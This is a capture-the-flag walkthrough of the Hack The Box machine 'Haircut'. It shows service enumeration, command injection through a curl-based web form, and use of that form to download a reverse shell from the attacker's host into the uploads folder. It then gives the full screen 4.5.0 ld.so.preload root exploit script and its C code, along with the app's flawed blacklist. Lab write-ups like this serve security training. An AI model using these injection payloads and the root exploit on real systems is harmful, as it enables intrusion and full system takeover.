# Haircut - Writeup

## Services
```bash
└─$ nmap -sC -sV -p 22,80 -oA nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 06:22 EDT
Nmap scan report for 10.129.249.117
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.54 seconds
```
Only two services are reachable on this box.
* 22 - Launchpad suggests this could be Ubuntu Xenial
* 80 - nginx server 1.10

## HTTP
Landing page is a static page with a single image from `$IP/bounce.jpg`.

`Wappalyzer` detected PHP, so I ran `gobuster` with the `-x` php extension and found 2 other pages:
```bash
└─$ ~/go/bin/gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.249.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2023/07/28 06:45:14 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 194] [--> http://10.129.249.117/uploads/]
/exposed.php          (Status: 200) [Size: 446]
```
`/uploads/` is returns 403 forbidden

`/exposed.php` provides an input box and promps user to "Enter a location to check", with an example of an http address.

Testing the input box and it appears to be using `curl` based on the information returned. It's similar to when a curl response is filtered.
```html
	<span>
		<p>Requesting Site...</p>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   223  100   223    0     0  44626      0 --:--:-- --:--:-- --:--:-- 55750
```

Which resembles:
```bash

└─$ curl $IP/test.html | grep carrie
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --100   223  100   223    0     0   2048      0 --:--:-- --:--:-- --:--:--  2064
        <img src='carrie.jpg'></img>
```
Using `--version` as input returns the version `curl 7.47.0`

The filtering prevents from certain special characters being sent with the command. If we send `;|&` as input the server responds with "| is not a good thing to put in a URL ".

We can send requests to our machine using this input and it is vulnerable to command injection. The filter does not prevent from sending the `$`, so we can try to use this to execute commands and extract more information. 
Send a request with the input `$(pwd)` to get the context that curl is executing in.
```bash
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.178] from (UNKNOWN) [10.129.249.117] 40148
GET //var/www/html HTTP/1.1
Host: 10.10.14.178:8888
User-Agent: curl/7.47.0
Accept: */*
```
As expected `curl` is executing in the root of the web application. We know that there is an `/uploads` folder that we can view the contents of, but we are able to execute scripts in that directory. We can use the `-o` flag to designate where to save our reverse shell and then navigate to `/upload/shell.php` to execute it.
Witht the input `http://10.10.14.178:8888/shell.php -o /uploads/shell.php` we upload the shell to the uploads folder. Sending a request to this location sends me the reverse shell.

## privEsc - Root

This is the code used for the blacklist:
```php
                        $disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');
                        foreach($disallowed as $naughty){
                                if(strpos($userurl,$naughty) !==false){
                                        echo $naughty.' is not a good thing to put in a URL';
                                        $naughtyurl=1;
                                }
                        }
                        if($naughtyurl==0){
                                echo shell_exec("curl ".$userurl." 2>&1");
                        }
```
As we suspected there is a blacklist being used to prevent some command injection. If the command is found with any blacklist characters it doesn't execute the command at all.

One of the first things I do when I get an initial foothold is search for binaries with suid:
```bash
www-data@haircut:/$ find / -type f -perm -4000 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/tmp/rootred
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
```
`screen4-5.0` is vulnerable to privilege escalation if it has suid. I manually exploited this vulnerability based on a script I found in exploit-db:
```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
```
I created these two binaries locally, because compiling from the victim was giving me issues. I had to create a container with Ubuntu 16x to create a compatible binary file. The first file is a `shared object`, which is a file that contains executable binary code and is analogous to dlls. A key feature of `.so` files is that they can be loaded at runtim. This shared object binary changes the owner of the second binary `rootshell` to root, sets the suid bit of that binary, and then unliks itself.

The second binary file sets the group id, user id, effective uid/gid, and then creates a new shell as that user (root). Its a commonly used binary file when an attacker has sudo write priv as it gives you a root shell.

```bash
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```
`umask 000` sets the file permission mask to not turn off any permissions

The next part of the script cleans up after itself and then calls the screen command:
* -D detach
* -m screen ignores the $STY environment variable
* -L specifies the logging script as `ld.so.preload`
* echo -ne "\x0a/tmp/libhax.so" - this part of the command adds the filenam of the share object to the logfile, causing it to be executed.

After this command executes the root shell binary should have suid bit set.
```bash
www-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/reddish.so"
www-data@haircut:/etc$ /tmp/rootred
# whoami
root
```
